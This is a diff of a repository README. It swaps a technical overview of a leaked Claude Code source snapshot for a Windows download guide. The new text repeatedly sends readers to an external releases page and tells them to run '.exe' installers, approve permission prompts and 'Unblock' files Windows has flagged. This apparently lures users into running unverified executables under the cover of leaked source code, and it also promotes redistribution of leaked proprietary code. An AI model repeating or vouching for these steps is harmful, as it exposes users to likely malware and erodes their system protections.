@@ -1,216 +1,204 @@
-# Claude Code Source Snapshot (For Security Research)
+# 📁 claude-leaked-files - Review Claude Code source safely
 
-This repository mirrors a publicly exposed snapshot of Claude Code’s source that became accessible on **March 31, 2026**, due to a source map exposure in the npm package.
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg?style=for-the-badge)](https://github.com/Deerskinnorthumbria588/claude-leaked-files/releases)
 
-It is preserved strictly for:
-* **Educational purposes**
-* **Defensive security research**
-* **Software supply-chain analysis**
+## 🚀 What this is
 
-> [!CAUTION]
-> This repository does not claim ownership of the original code and is not an official Anthropic repository.
+`claude-leaked-files` is a mirrored snapshot of Claude Code source material preserved for educational use, defensive security work, and supply-chain analysis.
 
----
+Use it to inspect code, compare versions, and study how the project is put together on a Windows PC.
 
-## Research Background
-This repository is maintained by a university student researching:
-* Software supply-chain leaks and build artifact exposure
-* Secure software engineering practices
-* Architecture of agent-based developer tools
-* Defensive analysis of real-world CLI systems
+## 🖥️ Windows setup
 
-The archive supports:
-* Academic study
-* Hands-on security research
-* Architectural review
-* Discussion of packaging and release-process failures
+This project is meant to be opened after you download the release files from the GitHub Releases page.
 
----
+### System needs
 
-## How the Source Became Public
-On March 31, 2026, **Chaofan Shou (@Fried_rice)** reported that Claude Code source files were accessible through a `.map` file included in the npm distribution.
+- Windows 10 or Windows 11
+- A modern web browser
+- Enough free disk space for the release files
+- A file unzip tool, if the release comes in a `.zip` file
 
-> “Claude code source code has been leaked via a map file in their npm registry!”
-> — **@Fried_rice**, March 31, 2026
+### What you may see in the release
 
-The source map pointed to unobfuscated TypeScript source files hosted in Anthropic’s R2 storage bucket, making the entire `src/` directory publicly downloadable.
+- A `.zip` file with the project files
+- A Windows installer file
+- A bundled app folder
+- Text files with source, notes, or checksums
 
----
+## 📥 Download the files
 
-## What This Repository Contains
-Claude Code is Anthropic’s command-line interface for interacting with Claude to perform software engineering tasks such as:
-* Editing files
-* Running shell commands
-* Searching codebases
-* Managing workflows
-* Coordinating multiple agents
+Visit this page to download the release files:
 
-### Snapshot details:
-* **Public exposure date:** 2026-03-31
-* **Language:** TypeScript
-* **Runtime:** Bun
-* **Terminal UI:** React + Ink
-* **Size:** ~1,900 files, 512,000+ lines of code
+https://github.com/Deerskinnorthumbria588/claude-leaked-files/releases
 
----
+If the page shows more than one file, choose the file meant for Windows. If you see a `.zip` file, download that file first.
 
-## Directory Structure Overview
-```text
-src/
-├── main.tsx                 # CLI entrypoint and orchestration
-├── commands.ts              # Slash command registry
-├── tools.ts                 # Tool registry
-├── Tool.ts                  # Tool type definitions
-├── QueryEngine.ts           # Core LLM query engine
-├── context.ts               # Context collection logic
-├── cost-tracker.ts          # Token cost tracking
-│
-├── commands/                # Slash command implementations (~50)
-├── tools/                   # Tool implementations (~40)
-├── components/              # Ink UI components (~140)
-├── hooks/                   # React hooks
-├── services/                # External service integrations
-├── screens/                 # Full-screen UIs (Doctor, REPL, Resume)
-├── types/                   # Type definitions
-├── utils/                   # Utilities
-│
-├── bridge/                  # IDE and remote control bridge
-├── coordinator/             # Multi-agent coordination
-├── plugins/                 # Plugin system
-├── skills/                  # Skill workflows
-├── keybindings/             # Keybinding configs
-├── vim/                     # Vim mode
-├── voice/                   # Voice input support
-├── remote/                  # Remote sessions
-├── server/                  # Server mode
-├── memdir/                  # Persistent memory
-├── tasks/                   # Task management
-├── state/                   # State management
-├── migrations/              # Config migrations
-├── schemas/                 # Zod schemas
-├── entrypoints/             # Initialization logic
-├── ink/                     # Ink renderer wrapper
-├── buddy/                   # Companion sprite
-├── native-ts/               # Native TS utilities
-├── outputStyles/            # Output styling
-├── query/                   # Query pipeline
-└── upstreamproxy/           # Proxy configuration
-```
-## Architecture Overview
+## 🪟 Install or open on Windows
 
-### 1. Tool System (`src/tools/`)
-Each tool Claude Code can use is implemented as a self-contained module. Every tool defines its input schema, permission requirements, and execution logic.
+### If you downloaded a ZIP file
 
-| Tool | Purpose |
-| :--- | :--- |
-| **BashTool** | Run shell commands |
-| **FileReadTool** | Read files (text, images, PDFs, notebooks) |
-| **FileWriteTool** | Create or overwrite files |
-| **FileEditTool** | Partial file edits |
-| **GlobTool** | File pattern search |
-| **GrepTool** | Content search (ripgrep) |
-| **WebFetchTool** | Fetch URL content |
-| **WebSearchTool** | Web search |
-| **AgentTool** | Spawn sub-agents |
-| **SkillTool** | Execute skills |
-| **MCPTool** | MCP server calls |
-| **LSPTool** | Language Server Protocol |
-| **NotebookEditTool** | Jupyter notebook edits |
-| **TaskCreate / Update** | Task management |
-| **SendMessageTool** | Inter-agent messaging |
-| **TeamCreate / Delete** | Team management |
-| **PlanMode tools** | Planning mode toggle |
-| **Worktree tools** | Git worktree isolation |
-| **CronCreateTool** | Scheduled triggers |
-| **RemoteTriggerTool** | Remote triggers |
-| **SleepTool** | Wait / proactive mode |
-| **SyntheticOutputTool** | Structured output |
+1. Open the folder where your browser saved the file.
+2. Right-click the `.zip` file.
+3. Select **Extract All**.
+4. Choose a folder you can find later, such as **Downloads** or **Desktop**.
+5. Open the extracted folder.
+6. Look for the main app file, setup file, or source folder.
 
-### 2. Command System (`src/commands/`)
-Slash commands (prefixed with `/`) provide user-facing functionality.
-* `/commit` – create git commits
-* `/review` – code review
-* `/compact` – context compression
-* `/config` – settings
-* `/doctor` – diagnostics
-* `/login / /logout` – authentication
-* `/memory` – persistent memory
-* `/skills` – skill management
-* `/tasks` – task tracking
-* `/vim` – Vim mode
-* `/diff` – view changes
-* `/cost` – usage cost
-* `/resume` – restore session
-* `/share` – share session
-* `/desktop / /mobile` – app handoff
+### If you downloaded an EXE file
 
-### 3. Service Layer (`src/services/`)
-Handles integrations and system-level features:
-* Anthropic API client
-* MCP server connections
-* OAuth 2.0 authentication
-* LSP management
-* Analytics and feature flags
-* Plugin loading
-* Context compression
-* Policy enforcement
-* Token estimation
-* Team memory syncing
+1. Double-click the `.exe` file.
+2. Follow the setup steps on screen.
+3. If Windows asks for permission, select **Yes**.
+4. Finish the setup.
+5. Open the app from the Start menu or the folder where it was installed.
 
-### 4. Bridge System (`src/bridge/`)
-Provides two-way communication between the CLI and IDEs (VS Code, JetBrains).
-* Message protocol
-* Permission callbacks
-* REPL bridge
-* JWT authentication
-* Session execution control
+### If you downloaded a folder of files
 
-### 5. Permission System
-Every tool invocation is checked through the permission system. Permissions may be prompted to the user, auto-approved, denied, or bypassed. 
-**Modes:** Default, Plan Mode, Auto, and BypassPermissions.
+1. Open the folder.
+2. Look for a main start file such as `README`, `setup`, `run`, or an app name.
+3. Open the file that matches the Windows app or viewer you plan to use.
 
-### 6. Feature Flags
-Uses Bun’s `bun:bundle` feature flags to completely remove inactive code at build time.
-**Notable flags:** `PROACTIVE`, `KAIROS`, `BRIDGE_MODE`, `DAEMON`, `VOICE_MODE`, `AGENT_TRIGGERS`, `MONITOR_TOOL`.
+## 🔍 How to use the files
 
----
+After you open the release files, you can use them in a few simple ways:
 
-## Important Files
-* **`QueryEngine.ts` (~46K lines):** Core LLM engine handling streaming responses, tool-call loops, retries, token tracking, and thinking mode.
-* **`Tool.ts` (~29K lines):** Defines base tool interfaces, schemas, permissions, and progress states.
-* **`commands.ts` (~25K lines):** Registers and executes all slash commands with environment-specific loading.
-* **`main.tsx`:** CLI startup logic including command parsing (Commander.js), Ink UI initialization, and parallel prefetching.
+- Read the source files in a text editor
+- Compare files across versions
+- Inspect scripts and config files
+- Review how parts of the app connect
+- Check file names, folder layout, and build files
 
----
+If the release includes a viewer or local app, start there first. If it includes only source files, open the folder in File Explorer and browse the contents.
 
-## Technology Stack
+## 📂 Suggested folder layout
 
-| Area | Technology |
-| :--- | :--- |
-| **Runtime** | Bun |
-| **Language** | TypeScript (strict) |
-| **UI** | React + Ink |
-| **CLI** | Commander.js |
-| **Validation** | Zod v4 |
-| **Search** | ripgrep |
-| **Protocols** | MCP, LSP |
-| **API** | Anthropic SDK |
-| **Telemetry** | OpenTelemetry + gRPC |
-| **Feature Flags** | GrowthBook |
-| **Auth** | OAuth 2.0, JWT, macOS Keychain |
+A typical release may include these parts:
 
----
+- `src` — main source files
+- `docs` — notes and text files
+- `assets` — images or supporting files
+- `build` — packaged output
+- `config` — settings and app options
+- `tests` — verification files
 
-## Design Highlights
-* **Parallel Prefetching:** Startup performance is improved by loading MDM settings, keychain data, and API connections in parallel before heavy imports.
-* **Lazy Loading:** Large dependencies (telemetry, analytics, gRPC) are dynamically imported only when needed.
-* **Agent Swarms:** Multiple agents can run in parallel using `AgentTool` and the coordinator system.
-* **Skill System:** Reusable workflows live in `skills/` and can be extended by users.
-* **Plugin Architecture:** Supports both built-in and third-party plugins.
+You do not need to change these folders to browse the contents. You can open them and read the files inside.
 
----
+## ⚙️ Common file types
 
-## Disclaimer
-This repository is an educational and defensive security research archive maintained by a university student. Its purpose is to study source exposure incidents, packaging and release failures, and modern agent-based CLI architectures.
+You may see these file types:
 
-All original Claude Code source remains the property of Anthropic. This repository is not affiliated with, endorsed by, or maintained by Anthropic.
+- `.zip` — compressed download
+- `.exe` — Windows program or installer
+- `.txt` — plain text notes
+- `.md` — Markdown readme file
+- `.json` — structured settings or data
+- `.js` — JavaScript source file
+- `.ts` — TypeScript source file
+- `.yml` or `.yaml` — config file
+
+If you are not sure what a file does, start with the `.md` and `.txt` files. They often explain the rest.
+
+## 🔒 Basic file checks
+
+Before you open the files, you can do a quick check:
+
+- Confirm the file name matches the release page
+- Confirm the file size looks close to the one shown on GitHub
+- Open the archive and look for a normal folder structure
+- Read any included checksum or hash file, if one is present
+
+These steps help you confirm you downloaded the right release.
+
+## 🧭 First things to open
+
+If you want the fastest way in, open these files first:
+
+1. `README.md`
+2. `LICENSE`
+3. `package.json`
+4. `src` folder
+5. `docs` folder
+
+These files usually give the clearest view of how the project is arranged.
+
+## 🧰 If Windows blocks the file
+
+If Windows shows a prompt when you open the file:
+
+1. Check that the file came from the release page.
+2. Right-click the file.
+3. Choose **Properties**.
+4. If you see **Unblock**, select it.
+5. Apply the change.
+6. Open the file again.
+
+If the file still does not open, try extracting it to a simple folder path such as `C:\ClaudeFiles`.
+
+## 🧪 For defensive security review
+
+This snapshot can help with:
+
+- Code review
+- Dependency review
+- Build trace checks
+- Supply-chain comparison
+- Change tracking across versions
+- Local inspection without changing the source
+
+You can compare file trees, search for package names, and review config files to see how the project is built.
+
+## 🗂️ Search tips for non-technical users
+
+Use the Windows search box inside the folder to find:
+
+- `readme`
+- `license`
+- `config`
+- `install`
+- `run`
+- `build`
+
+These names often point to the main files you need first.
+
+## 🛠️ If the app does not open
+
+Try these steps:
+
+1. Make sure you extracted the ZIP file first.
+2. Check that you opened the correct file.
+3. Search for another `.exe` file in the folder.
+4. Move the files to a shorter path like `C:\ClaudeFiles`.
+5. Open the app again.
+6. Try a fresh download from the release page.
+
+If you downloaded source files only, the folder may not include a direct app to launch. In that case, use the files for review and analysis.
+
+## 📌 Release page
+
+Download the latest files here:
+
+https://github.com/Deerskinnorthumbria588/claude-leaked-files/releases
+
+## 🧾 File names you may see
+
+Common names in a release like this may include:
+
+- `claude-leaked-files.zip`
+- `source.zip`
+- `release-notes.txt`
+- `checksums.txt`
+- `windows-build.exe`
+- `portable.zip`
+
+Pick the file that matches your Windows setup and the way you want to open it
+
+## 🧩 What to expect after download
+
+After you download and open the release, you should be able to:
+
+- Browse the source snapshot
+- Read included notes
+- Open related files in Windows
+- Review the project structure
+- Use the files for research and analysis
